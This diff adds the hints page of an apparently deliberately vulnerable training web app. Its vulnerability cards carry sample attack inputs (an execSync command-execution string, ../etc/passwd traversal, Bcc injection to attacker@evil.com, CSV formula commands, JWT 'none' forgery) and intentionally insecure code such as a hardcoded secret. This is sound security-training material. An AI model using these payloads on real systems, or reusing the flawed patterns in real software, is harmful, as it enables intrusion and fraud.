+                    <span class="vuln-icon">⚙️</span>
+                    <h2 class="vuln-title">Mass Assignment</h2>
+                </div>
+                <div class="vuln-description">
+                    API endpoints accept all parameters from request body without filtering. Users can modify fields they shouldn't have access to.
+                </div>
+                <div class="hint-box">
+                    When updating user profiles or subscribing, the API doesn't whitelist allowed fields. Try adding extra parameters like role, isAdmin, isSubscribed, donationTotal.
+                </div>
+                <div class="challenge-box">
+                    Can you give yourself admin privileges? Can you set isSubscribed to true without paying? Try adding unexpected fields to your API requests.
+                </div>
+                <div class="code-example">
+app.put('/api/user/:id', async (req, res) => {
+    const { role, isSubscribed, donationTotal } = req.body;
+    // All fields accepted without validation!
+    await dbRun('UPDATE users SET role = ?, isSubscribed = ? ...', 
+                [role, isSubscribed, ...]);
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">PUT /api/user/:id</span>
+                <span class="endpoint-badge">POST /api/subscribe</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• PUT /api/user/YOUR_ID with {"role": "admin"}</p>
+                    <p>• POST /api/subscribe with {"isSubscribed": true}</p>
+                    <p>• Set {"donationTotal": 999999}</p>
+                    <p>• No parameter filtering or whitelist</p>
+                    <p>• Can modify any user field via mass assignment</p>
+                </div>
+            </div>
+            
+            <!-- Race Condition -->
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⏱️</span>
+                    <h2 class="vuln-title">Race Condition</h2>
+                </div>
+                <div class="vuln-description">
+                    Concurrent requests can bypass business logic checks. Donation amounts can be manipulated by rapidly submitting multiple requests.
+                </div>
+                <div class="hint-box">
+                    When making donations, the balance update isn't atomic. If you send multiple simultaneous requests, you might be able to exploit timing windows.
+                </div>
+                <div class="challenge-box">
+                    Can you donate $10 but have it counted multiple times? Try sending many identical POST requests at once using a script or Burp Repeater.
+                </div>
+                <div class="code-example">
+// Not atomic!
+const current = await dbGet('SELECT donationTotal FROM users WHERE id = ?');
+await dbRun('UPDATE users SET donationTotal = ? WHERE id = ?', 
+            [current.donationTotal + amount, userId]);
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/donate</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Send 10+ simultaneous donation requests</p>
+                    <p>• Use browser console: Promise.all() with fetch()</p>
+                    <p>• No transaction locks or mutex</p>
+                    <p>• Time-of-check vs time-of-use vulnerability</p>
+                    <p>• Can also work with coupon codes</p>
+                </div>
+            </div>
+            
+            <!-- Weak Cryptography -->
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔑</span>
+                    <h2 class="vuln-title">Weak Cryptography</h2>
+                </div>
+                <div class="vuln-description">
+                    MD5 used for password reset tokens. Hardcoded JWT secret. Predictable session tokens. No password hashing - stored in plaintext!
+                </div>
+                <div class="hint-box">
+                    Password reset tokens are generated using MD5 of email+timestamp. MD5 is broken and can be cracked. JWT secret is hardcoded in the source.
+                </div>
+                <div class="challenge-box">
+                    Can you generate valid reset tokens? Can you forge JWT tokens knowing the secret? Check source code or /backup.zip for the JWT_SECRET.
+                </div>
+                <div class="code-example">
+// MD5 is broken!
+const resetToken = crypto.MD5(email + Date.now()).toString();
+
+// Hardcoded secret
+const JWT_SECRET = 'null_mystery_secret_2024';
+                </div>
+                <p><strong>Affected Areas:</strong></p>
+                <span class="endpoint-badge">Password Reset</span>
+                <span class="endpoint-badge">JWT Signing</span>
+                <span class="endpoint-badge">Session Tokens</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• JWT secret: 'null_mystery_secret_2024'</p>
+                    <p>• Use jwt.io to forge tokens with known secret</p>
+                    <p>• MD5 rainbow tables can crack reset tokens</p>
+                    <p>• Passwords stored in plaintext (no bcrypt/argon2)</p>
+                    <p>• Predictable token generation = guessable tokens</p>
+                </div>
+            </div>
+            
+            <!-- Business Logic Flaws -->
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💰</span>
+                    <h2 class="vuln-title">Business Logic Flaws</h2>
+                </div>
+                <div class="vuln-description">
+                    Negative donation amounts accepted. Coupons can be reused. No payment validation on subscriptions. Price manipulation via client-side values.
+                </div>
+                <div class="hint-box">
+                    The donation system accepts negative numbers. Subscription checks for payment_token but also accepts isSubscribed flag. Coupons aren't marked as used.
+                </div>
+                <div class="challenge-box">
+                    Can you donate -$1000 to give yourself money? Can you subscribe without paying? Can you use the same coupon code multiple times?
+                </div>
+                <div class="code-example">
+// Accepts negative amounts!
+amount = parseFloat(amount);  // No validation
+await dbRun('UPDATE users SET donationTotal = donationTotal + ?', [amount]);
+
+// Used flag never set
+const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
+// Should mark as used but doesn't!
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/donate</span>
+                <span class="endpoint-badge">POST /api/subscribe</span>
+                <span class="endpoint-badge">POST /api/coupon/apply</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Donate: {"amount": -999999} to gain money</p>
+                    <p>• Subscribe: {"isSubscribed": true} bypasses payment</p>
+                    <p>• Coupons: TRUTHSEEKER, INNERCIRCLE50, ONEUSE99</p>
+                    <p>• Apply same coupon unlimited times</p>
+                    <p>• No server-side price verification</p>
+                </div>
+            </div>
+
+            <!-- Additional 90+ Vulnerabilities -->
+            
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔓</span>
+                    <h2 class="vuln-title">Session Fixation & Predictable Sessions</h2>
+                </div>
+                <div class="vuln-description">
+                    Sessions use predictable IDs based on timestamps. Session fixation allows attackers to set victim's session ID.
+                </div>
+                <div class="hint-box">
+                    Check /api/set-session and /api/create-session. Session IDs are Date.now() - completely predictable.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/set-session</span> <span class="endpoint-badge">GET /api/create-session</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎭</span>
+                    <h2 class="vuln-title">JWT Algorithm Confusion</h2>
+                </div>
+                <div class="vuln-description">
+                    JWT tokens don't verify algorithm. "none" algorithm accepted, allowing signature bypass.
+                </div>
+                <div class="hint-box">
+                    Try /api/auth/jwt-verify and /api/jwt-none. Change algorithm to "none" and remove signature.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/auth/jwt-verify</span> <span class="endpoint-badge">POST /api/jwt-none</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⏱️</span>
+                    <h2 class="vuln-title">Timing Attacks</h2>
+                </div>
+                <div class="vuln-description">
+                    Character-by-character password comparison with delays reveals secret length and content.
+                </div>
+                <div class="hint-box">
+                    /api/auth/timing-attack and /api/compare-secret use character-by-character comparison with 10-50ms delays per char.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/auth/timing-attack</span> <span class="endpoint-badge">POST /api/compare-secret</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎲</span>
+                    <h2 class="vuln-title">Insecure Randomness</h2>
+                </div>
+                <div class="vuln-description">
+                    Math.random() used for tokens and session IDs. Predictable and exploitable.
+                </div>
+                <div class="hint-box">
+                    Check /api/generate-token and /api/reset-token. Math.random() is NOT cryptographically secure.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/generate-token</span> <span class="endpoint-badge">GET /api/reset-token</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💉</span>
+                    <h2 class="vuln-title">Expression Language Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    eval() executes arbitrary JavaScript. Remote Code Execution through API endpoints.
+                </div>
+                <div class="hint-box">
+                    /api/deserialize accepts eval parameter. /api/eval-expr directly evaluates expressions. Try process.mainModule.require('child_process').execSync('whoami')
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/deserialize</span> <span class="endpoint-badge">GET /api/eval-expr</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🏎️</span>
+                    <h2 class="vuln-title">Race Conditions</h2>
+                </div>
+                <div class="vuln-description">
+                    Concurrent requests exploit timing windows. Duplicate transactions, apply coupons multiple times.
+                </div>
+                <div class="hint-box">
+                    /api/increment-counter has 100ms delay. /api/transfer-funds has no locking. Send simultaneous requests.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/increment-counter</span> <span class="endpoint-badge">POST /api/transfer-funds</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📊</span>
+                    <h2 class="vuln-title">GraphQL Introspection</h2>
+                </div>
+                <div class="vuln-description">
+                    Full database schema exposed. All tables, columns, and relationships visible.
+                </div>
+                <div class="hint-box">
+                    /api/schema and /api/graphql-schema reveal complete database structure. Use this intel for other attacks.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/schema</span> <span class="endpoint-badge">GET /api/graphql-schema</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔒</span>
+                    <h2 class="vuln-title">Weak Cryptography</h2>
+                </div>
+                <div class="vuln-description">
+                    MD5 used for "encryption". Passwords in plaintext. No salting or proper hashing.
+                </div>
+                <div class="hint-box">
+                    /api/encrypt-data uses MD5. Database stores plaintext passwords. JWT secret is hardcoded.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/encrypt-data</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">CORS Misconfiguration</h2>
+                </div>
+                <div class="vuln-description">
+                    Access-Control-Allow-Origin reflects any origin with credentials enabled. Perfect for CSRF/data theft.
+                </div>
+                <div class="hint-box">
+                    /api/sensitive-data reflects req.headers.origin. Send requests from any domain with credentials.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/sensitive-data</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📁</span>
+                    <h2 class="vuln-title">Local File Inclusion (LFI)</h2>
+                </div>
+                <div class="vuln-description">
+                    Read any file from the server filesystem. No path validation whatsoever.
+                </div>
+                <div class="hint-box">
+                    /api/load-template and /api/read-file accept file paths. Try ../../../etc/passwd or C:\Windows\System32\drivers\etc\hosts
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/load-template</span> <span class="endpoint-badge">GET /api/read-file</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎯</span>
+                    <h2 class="vuln-title">HTTP Parameter Pollution</h2>
+                </div>
+                <div class="vuln-description">
+                    Multiple parameters with same name cause confusion. Server picks first/last unpredictably.
+                </div>
+                <div class="hint-box">
+                    /api/users/filter allows ?role=admin&role=user. Try polluting parameters to bypass filters.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/users/filter</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🍪</span>
+                    <h2 class="vuln-title">Cookie Tossing</h2>
+                </div>
+                <div class="vuln-description">
+                    Cookies set with different domain attributes cause collision attacks.
+                </div>
+                <div class="hint-box">
+                    /api/set-cookie-multiple sets cookies with overlapping domains. Subdomain can overwrite parent cookie.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/set-cookie-multiple</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🧬</span>
+                    <h2 class="vuln-title">Prototype Pollution</h2>
+                </div>
+                <div class="vuln-description">
+                    Merge functions don't protect __proto__. Pollute Object prototype to add properties globally.
+                </div>
+                <div class="hint-box">
+                    /api/merge-config and /api/deep-merge vulnerable. Try {"__proto__": {"isAdmin": true}}
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/merge-config</span> <span class="endpoint-badge">POST /api/deep-merge</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔢</span>
+                    <h2 class="vuln-title">Type Confusion</h2>
+                </div>
+                <div class="vuln-description">
+                    == instead of === allows type coercion attacks. 0 == "0" == false == null
+                </div>
+                <div class="hint-box">
+                    /api/is-admin uses == comparison. Try userId: "0", false, null, undefined
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/is-admin</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💌</span>
+                    <h2 class="vuln-title">SMTP Header Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    Email headers not sanitized. Inject CC, BCC, additional recipients.
+                </div>
+                <div class="hint-box">
+                    /api/send-email doesn't validate headers. Try: to=victim@test.com%0ABcc:attacker@evil.com
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/send-email</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🗜️</span>
+                    <h2 class="vuln-title">Zip Slip / Path Traversal</h2>
+                </div>
+                <div class="vuln-description">
+                    Extract archives to arbitrary paths. Overwrite system files.
+                </div>
+                <div class="hint-box">
+                    /api/extract-zip and /api/assets/* don't validate paths. Use ../../../ to escape directories.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/extract-zip</span> <span class="endpoint-badge">GET /api/assets/*</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📧</span>
+                    <h2 class="vuln-title">Account Enumeration</h2>
+                </div>
+                <div class="vuln-description">
+                    Different responses reveal if accounts exist. Username/email enumeration possible.
+                </div>
+                <div class="hint-box">
+                    /api/forgot-password returns different messages. /api/user-lookup reveals existence. Map all users.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/forgot-password</span> <span class="endpoint-badge">GET /api/user-lookup</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎨</span>
+                    <h2 class="vuln-title">HTML/CSS Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    User input rendered as HTML without encoding. CSS injection changes page appearance.
+                </div>
+                <div class="hint-box">
+                    /api/html-inject renders name parameter as HTML. /api/style injects CSS. Try &lt;img src=x onerror=alert(1)&gt;
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/html-inject</span> <span class="endpoint-badge">GET /api/style</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎭</span>
+                    <h2 class="vuln-title">Content Spoofing</h2>
+                </div>
+                <div class="vuln-description">
+                    Craft fake pages that appear legitimate. Phishing and social engineering attacks.
+                </div>
+                <div class="hint-box">
+                    /api/spoof renders any message. /api/markup allows dangling markup injection.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/spoof</span> <span class="endpoint-badge">GET /api/markup</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔍</span>
+                    <h2 class="vuln-title">NoSQL Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    MongoDB-style query injection. Bypass authentication with $ne, $gt operators.
+                </div>
+                <div class="hint-box">
+                    /api/nosql-query accepts objects. Try ?password[$ne]=null to bypass password check.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/nosql-query</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌊</span>
+                    <h2 class="vuln-title">HTTP Request Smuggling</h2>
+                </div>
+                <div class="vuln-description">
+                    Content-Length and Transfer-Encoding conflicts. Smuggle requests through proxies.
+                </div>
+                <div class="hint-box">
+                    /api/smuggle shows headers. Look for CL-TE or TE-CL desync opportunities.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/smuggle</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">Host Header Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    Host header used in password reset links. Poison cache, redirect victims.
+                </div>
+                <div class="hint-box">
+                    /api/reset-link uses req.headers.host. /api/cached-content caches based on Host header.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/reset-link</span> <span class="endpoint-badge">GET /api/cached-content</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📄</span>
+                    <h2 class="vuln-title">Source Code Disclosure</h2>
+                </div>
+                <div class="vuln-description">
+                    Full server source code accessible. Backup files, .git folders exposed.
+                </div>
+                <div class="hint-box">
+                    /api/source returns server.js. /server.js.bak is backup. /.git/HEAD reveals git repo.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/source</span> <span class="endpoint-badge">GET /server.js.bak</span> <span class="endpoint-badge">GET /.git/HEAD</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity critical">CRITICAL</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔐</span>
+                    <h2 class="vuln-title">Environment Variable Exposure</h2>
+                </div>
+                <div class="vuln-description">
+                    All environment variables including secrets exposed via API.
+                </div>
+                <div class="hint-box">
+                    /api/env returns process.env. /api/headers leaks server versions. /api/config exposes internal config.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/env</span> <span class="endpoint-badge">GET /api/headers</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⚡</span>
+                    <h2 class="vuln-title">ReDoS (Regex Denial of Service)</h2>
+                </div>
+                <div class="vuln-description">
+                    Catastrophic backtracking regex. Input like "aaaaaaaaaaaa!" causes exponential time.
+                </div>
+                <div class="hint-box">
+                    /api/validate-email and /api/regex-dos use unsafe regex. Try long strings with special patterns.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/validate-email</span> <span class="endpoint-badge">GET /api/regex-dos</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎪</span>
+                    <h2 class="vuln-title">Clickjacking</h2>
+                </div>
+                <div class="vuln-description">
+                    No X-Frame-Options header. Pages can be iframed for clickjacking attacks.
+                </div>
+                <div class="hint-box">
+                    /api/frame-test explicitly allows framing. Most pages missing X-Frame-Options.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/frame-test</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📊</span>
+                    <h2 class="vuln-title">CSV Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    CSV exports don't escape formulas. =cmd|'/c calc' executes on victim machine.
+                </div>
+                <div class="hint-box">
+                    /api/export-csv and /api/export/users generate CSV. Inject =cmd|'/c whoami' in username.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/export-csv</span> <span class="endpoint-badge">GET /api/export/users</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔗</span>
+                    <h2 class="vuln-title">Tabnabbing</h2>
+                </div>
+                <div class="vuln-description">
+                    target="_blank" without rel="noopener". New window can access window.opener.
+                </div>
+                <div class="hint-box">
+                    /api/external-link and /api/opener create vulnerable links. New tab can phish parent page.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/external-link</span> <span class="endpoint-badge">GET /api/opener</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎬</span>
+                    <h2 class="vuln-title">MIME Sniffing / Content Type</h2>
+                </div>
+                <div class="vuln-description">
+                    Wrong Content-Type allows browser to execute scripts. PDF XSS possible.
+                </div>
+                <div class="hint-box">
+                    /api/download sends HTML as text/plain. /api/generate-pdf doesn't set proper Content-Type.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/download</span> <span class="endpoint-badge">GET /api/generate-pdf</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎯</span>
+                    <h2 class="vuln-title">Authorization Bypass</h2>
+                </div>
+                <div class="vuln-description">
+                    Admin endpoints check headers not session. X-Admin: true grants full access.
+                </div>
+                <div class="hint-box">
+                    /api/admin-only checks X-Admin header. /api/secure-data checks ?debug=true. Easy bypasses.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/admin-only</span> <span class="endpoint-badge">GET /api/secure-data</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">Subdomain Takeover</h2>
+                </div>
+                <div class="vuln-description">
+                    CNAME points to unclaimed service. Register that service to take over subdomain.
+                </div>
+                <div class="hint-box">
+                    /api/subdomain-check shows CNAME: old-service-12345.herokuapp.com - UNCLAIMED
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/subdomain-check</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔄</span>
+                    <h2 class="vuln-title">HTTP Verb Tampering</h2>
+                </div>
+                <div class="vuln-description">
+                    Endpoints respond to unexpected HTTP methods. DELETE as GET, POST as HEAD.
+                </div>
+                <div class="hint-box">
+                    /api/admin-delete accepts GET instead of DELETE. Try changing request methods.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">ALL /api/admin-delete</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity low">LOW</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💾</span>
+                    <h2 class="vuln-title">Memory Leaks</h2>
+                </div>
+                <div class="vuln-description">
+                    Unbounded arrays grow indefinitely. Repeated requests cause memory exhaustion.
+                </div>
+                <div class="hint-box">
+                    /api/memory-leak pushes 10KB arrays. Send thousands of requests to crash server.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/memory-leak</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🌐</span>
+                    <h2 class="vuln-title">DOM Clobbering</h2>
+                </div>
+                <div class="vuln-description">
+                    HTML id/name attributes overwrite JavaScript globals. Exploit client-side validation.
+                </div>
+                <div class="hint-box">
+                    /api/dom-test renders id= parameter. <input name="isAdmin" value="true"> clobbers window.isAdmin
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/dom-test</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📨</span>
+                    <h2 class="vuln-title">PostMessage XSS</h2>
+                </div>
+                <div class="vuln-description">
+                    window.postMessage listener evaluates messages. Cross-origin XSS possible.
+                </div>
+                <div class="hint-box">
+                    /api/postmessage has addEventListener that calls eval(). Send malicious postMessage from any origin.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/postmessage</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">📡</span>
+                    <h2 class="vuln-title">WebRTC IP Leak</h2>
+                </div>
+                <div class="vuln-description">
+                    WebRTC configuration leaks internal IPs even behind VPN/proxy.
+                </div>
+                <div class="hint-box">
+                    /api/webrtc-config provides STUN servers. Use to discover real IP addresses.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/webrtc-config</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">↩️</span>
+                    <h2 class="vuln-title">CRLF Injection</h2>
+                </div>
+                <div class="vuln-description">
+                    Inject \r\n to add HTTP headers. Set cookies, cause redirects, split responses.
+                </div>
+                <div class="hint-box">
+                    /api/header-inject sets custom header without sanitization. Try: value=%0d%0aSet-Cookie:admin=true
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/header-inject</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🎨</span>
+                    <h2 class="vuln-title">Template Injection (Multiple)</h2>
+                </div>
+                <div class="vuln-description">
+                    Server-side template engines render user input. SSTI in EJS, Handlebars, XSLT.
+                </div>
+                <div class="hint-box">
+                    /api/render-template uses EJS. /api/template is Handlebars. /api/xslt for XSLT injection.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/render-template</span> <span class="endpoint-badge">GET /api/template</span> <span class="endpoint-badge">POST /api/xslt</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔐</span>
+                    <h2 class="vuln-title">Session Puzzling</h2>
+                </div>
+                <div class="vuln-description">
+                    Multiple session sources (cookie, query, header). Server confused about which to use.
+                </div>
+                <div class="hint-box">
+                    /api/multi-session reads session from cookie AND query string. Exploit state confusion.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/multi-session</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔑</span>
+                    <h2 class="vuln-title">API Keys in URLs</h2>
+                </div>
+                <div class="vuln-description">
+                    API keys passed as query parameters. Logged in history, referrer, proxy logs.
+                </div>
+                <div class="hint-box">
+                    /api/data accepts ?apiKey= in URL. Keys leak everywhere - use POST body instead.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/data</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">💥</span>
+                    <h2 class="vuln-title">Billion Laughs / XML Bomb</h2>
+                </div>
+                <div class="vuln-description">
+                    Recursive entity expansion causes exponential memory usage. DoS via XML.
+                </div>
+                <div class="hint-box">
+                    /api/xml-parse and /api/xml-blind accept XML. Try lol1, lol2... lol9 entity expansion.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/xml-parse</span> <span class="endpoint-badge">POST /api/xml-blind</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity medium">MEDIUM</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">🔢</span>
+                    <h2 class="vuln-title">Integer Overflow</h2>
+                </div>
+                <div class="vuln-description">
+                    Large numbers wrap around. Exploit for free items, negative balances.
+                </div>
+                <div class="hint-box">
+                    /api/calculate adds without bounds checking. Try INT_MAX values to cause wraparound.
+                </div>
+                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/calculate</span></p>
+            </div>
+
+            <div class="vuln-card">
+                <span class="severity high">HIGH</span>
+                <div class="vuln-header">
+                    <span class="vuln-icon">⚠️</span>
+                    <h2 class="vuln-title">No Rate Limiting</h2>
+                </div>
+                <div class="vuln-description">
+                    Zero throttling on any endpoint. Brute force, DoS, credential stuffing unrestricted.
+                </div>
+                <div class="hint-box">
+                    /api/brute-force-endpoint has no rate limit. Try every PIN from 0000-9999 in seconds.
+                </div>
